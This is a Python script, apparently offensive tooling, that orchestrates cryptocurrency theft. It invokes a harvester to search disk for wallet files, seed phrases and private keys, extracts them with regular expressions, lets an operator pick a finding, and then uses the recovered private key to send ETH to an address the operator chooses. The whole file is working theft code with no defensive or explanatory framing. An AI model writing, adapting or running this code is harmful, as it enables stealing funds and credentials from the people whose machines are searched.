"""
Fortress Offensive Crypto Orchestrator

This script automates the workflow of:
  1. Harvesting wallet & seed evidence from disk (across common wallet/file patterns)
  2. Presenting discoveries to the operator for review
  3. Guiding the operator through transfer/withdraw with optional automation
  4. Supports multi-coin expansion

REQUIRES: web3[http] for Ethereum, others for BTC/etc (see comments)
"""

import os
import sys
import re
import subprocess

# --- Import ETH transfer
try:
    from crypto_transfer_eth import send_eth
except ImportError:
    def send_eth(*args, **kwargs):
        print("[!] Ethereum transfer module not installed.") 

FINDINGS_FILE = "crypto_manifest.txt"

# --- Step 1: Harvest Artifacts ---
def harvest_artifacts():
    print("[*] Harvesting possible wallet/seed/private key locations...")
    subprocess.run([sys.executable, "crypto_harvester.py"])
    if not os.path.exists(FINDINGS_FILE):
        print("[X] Harvest step failed: No manifest results.")
        sys.exit(1)

# --- Step 2: Parse Findings ---
def parse_findings():
    wallets = []
    patterns = {
        "eth_key": r"(0x)?[a-fA-F0-9]{64,66}",            # raw/private key
        "eth_address": r"0x[a-fA-F0-9]{40}",              # eth address
        "btc_address": r"\b(1[a-zA-Z0-9]{25,34})\b",      # btc legacy
        "seed_phrase": r"([a-z ]{12,24})"                 # rough mnemonics
    }
    with open(FINDINGS_FILE, "r") as f:
        for line in f:
            data = {"file": line.strip()}
            for label, reg in patterns.items():
                found = re.findall(reg, line, re.IGNORECASE)
                if found:
                    data[label] = found
            wallets.append(data)
    return wallets

# --- Step 3: Operator Review & Input ---
def operator_review(wallets):
    print("\n[!] Potential keys/wallet/phrases found:\n")
    for idx, item in enumerate(wallets):
        print(f"#{idx+1}:")
        for k, v in item.items():
            print(f"   {k}: {v}")
        print()
    selected = input("Select entry number to process (or press Enter to quit): ")
    if not selected.isdigit() or int(selected) < 1 or int(selected) > len(wallets):
        print("Quitting or invalid selection.")
        sys.exit(0)
    return wallets[int(selected)-1]

# --- Step 4: Attempt Automated Transfer (Example: ETH) ---
def automate_eth(item):
    # Prompt for ETH recipient and how much
    print("== Ethereum Transfer ==")
    priv_candidates = []
    for k in ["eth_key", "seed_phrase"]:
        if k in item:
            priv_candidates.extend(item[k] if isinstance(item[k], list) else [item[k]])
    if not priv_candidates:
        print("No private key or seed found in this entry.")
        return
    priv = input(f"Candidate private key (or paste correct one) [{priv_candidates[0]}]: ") or priv_candidates[0]
    to_addr = input("Destination ETH address: ").strip()
    val = input("ETH amount to send: ").strip()
    try:
        val = float(val)
    except:
        print("Invalid amount.")
        return
    try:
        txid = send_eth(priv, to_addr, val)
        print(f"[√] Transfer submitted, txid: {txid}")
    except Exception as e:
        print(f"[X] Transfer failed: {e}")

# --- Main Orchestration ---
def main():
    harvest_artifacts()
    wallets = parse_findings()
    if not wallets:
        print("[X] No crypto artifacts found.")
        sys.exit(0)
    item = operator_review(wallets)
    # Example: If ETH key present, handle that case with send_eth
    if "eth_key" in item or "seed_phrase" in item:
        automate_eth(item)
    else:
        print("No ETH privkey/seed found in selection. Consider expanding coin support.")

if __name__ == "__main__":
    main()